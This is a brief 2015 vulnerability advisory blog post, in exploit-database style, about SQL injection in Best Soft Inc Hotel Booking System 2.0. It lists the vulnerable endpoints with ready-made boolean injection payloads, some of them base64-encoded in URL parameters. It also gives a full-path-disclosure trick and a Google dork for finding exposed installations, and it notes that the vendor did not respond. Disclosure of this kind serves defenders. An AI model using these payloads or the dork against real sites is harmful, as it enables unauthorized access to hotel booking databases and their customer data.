Title: Best Soft Inc Hotel Booking System 2.0 SQLi
Author: dsc
Date: 2015-8-1 11:12
Tags: advisory, exploits
Slug: best-soft-inc-hotel-booking-system-2-sqli

## Advisory

    # Exploit Title: Best Soft Inc Hotel Booking System 2.0 SQLi
    # Date: 2015-8-1
    # Author: Sander 'dsc' Ferdinand
    # Blog: https://ced.pwned.systems/advisories-best-soft-inc-hotel-booking-system-2-sqli.html
    # Vendor Homepage: http://www.bestsoftinc.com
    # Reported: 2015-8-1
    # Vendor response: none
    # Software Link: http://www.bestsoftinc.com/online-hotel-booking-system.html
    # Google Dork: inurl:/hotel-booking/cp/
    # Tested on: Linux
    # CVE : none
    
    SQLi's:
      HTTP POST to "/hotel-booking/booking-search.php"
        check_in=06%2F08%2F2014
        check_out=16%2F08%2F2014
        capacity=2 and 1=1
    
      /cp/add_edit_roomtype.php?id=1 AND 1337=1336
      /cp/customerbooking.php?client=MiBhbmQgMT0x    
           (1 and 1=2)
      /cp/viewdetails.php?booking_id=MTM0NTE4MzkwMyBhbmQgMT0y&book_type=1  
           (1 and 1=2)
    
    FPD:
      /cp/add_edit_language.php?id[]=13